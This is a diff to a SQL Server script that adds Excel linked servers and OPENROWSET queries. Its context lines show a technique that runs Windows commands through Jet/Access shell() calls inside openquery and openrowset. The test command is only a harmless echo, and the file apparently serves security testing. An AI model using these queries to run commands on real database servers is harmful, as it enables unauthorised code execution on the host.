@@ -38,6 +38,10 @@ exec sp_addlinkedserver @server='Access_12',
 @provider='Microsoft.ACE.OLEDB.12.0',
 @datasrc='C:\Windows\Temp\SystemIdentity.mdb'
 
+EXEC master.dbo.sp_addlinkedserver @server = N'excelxx', 
+@srvproduct=N'Excel', @provider=N'Microsoft.ACE.OLEDB.12.0', 
+@datasrc=N'C:\windows\temp\test.xls', @provstr=N'Excel 15.0'
+
 -- List linked servers
 select * from master..sysservers
 
@@ -45,6 +49,7 @@ select * from master..sysservers
 SELECT * from openquery([Access_4],'select 1')
 SELECT * from openquery([Access_12],'select 1')
 SELECT * from openquery([Access],'select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
+SELECT * FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0','Excel 8.0;Database=C:\windows\temp\test.xls', 'SELECT * FROM [Sheet1$]')
 
 -- Drop linked servers
 sp_dropserver "Access_4"
@@ -54,6 +59,7 @@ sp_dropserver "Access_12"
 select * from master..sysservers
 
 -- Look into additional examples for cmd exec
+SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Excel 12.0;Database=C:\windows\temp\test.xls', 'SELECT * FROM [Sheet1$]')
 select * from openrowset('SQLOLEDB',';database=C:\Windows\Temp\SystemIdentity.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
 select * from openrowset('microsoft.jet.oledb.4.0',';database=C:\Windows\System32\LogFiles\Sum\Current.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
 INSERT INTO OPENROWSET ('Microsoft.Jet.OLEDB.4.0', 'Excel 8.0;Database=G:\Test.xls;', 'SELECT * FROM [Sheet1$]')
